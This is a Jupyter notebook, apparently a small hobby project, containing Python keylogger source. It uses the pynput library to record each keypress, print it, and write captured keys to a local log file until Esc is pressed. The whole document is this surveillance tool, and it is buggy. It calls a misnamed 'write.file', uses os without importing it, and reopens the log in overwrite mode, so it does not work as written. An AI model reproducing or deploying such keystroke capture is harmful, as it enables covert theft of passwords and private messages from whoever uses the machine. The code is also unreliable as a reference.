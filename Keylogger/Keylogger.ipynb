{
 "cells": [
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "96061c6c",
   "metadata": {},
   "outputs": [],
   "source": [
    "import pynput\n",
    "\n",
    "from pynput.keyboard import Key, Listener\n",
    "\n",
    "count=0\n",
    "keys=[]\n",
    "\n",
    "\n",
    "\n",
    "def on_press(key):\n",
    "    global keys, count\n",
    "    \n",
    "    keys.append(key)\n",
    "    count+=1\n",
    "    print(\"{0} pressed\".format(key))\n",
    "    \n",
    "    if count>=5:\n",
    "        count=0\n",
    "        write.file(keys)\n",
    "        keys=[]\n",
    "        \n",
    "save_path='D:\\Python mini\\Keylogger'\n",
    "file_name=\"log.txt\"\n",
    "\n",
    "complete_name = os.path.join(save_path, file_name)\n",
    "\n",
    "def write_file(keys):\n",
    "    with open(complete_name, \"w\") as f:\n",
    "        for key in keys:\n",
    "            k = str(key).replace(\"'\",\"\")\n",
    "            if k.find(\"space\")>0:\n",
    "                f.write('\\n')\n",
    "            elif k.find(\"Key\")==-1:\n",
    "                f.write(k)\n",
    "            \n",
    "    \n",
    "def on_release(key):\n",
    "    if key==Key.esc:\n",
    "        return False\n",
    "    \n",
    "    \n",
    "with Listener(on_press=on_press, on_release=on_release) as listener:\n",
    "    listener.join()"
   ]
  }
 ],
 "metadata": {
  "kernelspec": {
   "display_name": "Python 3",
   "language": "python",
   "name": "python3"
  },
  "language_info": {
   "codemirror_mode": {
    "name": "ipython",
    "version": 3
   },
   "file_extension": ".py",
   "mimetype": "text/x-python",
   "name": "python",
   "nbconvert_exporter": "python",
   "pygments_lexer": "ipython3",
   "version": "3.8.8"
  }
 },
 "nbformat": 4,
 "nbformat_minor": 5
}
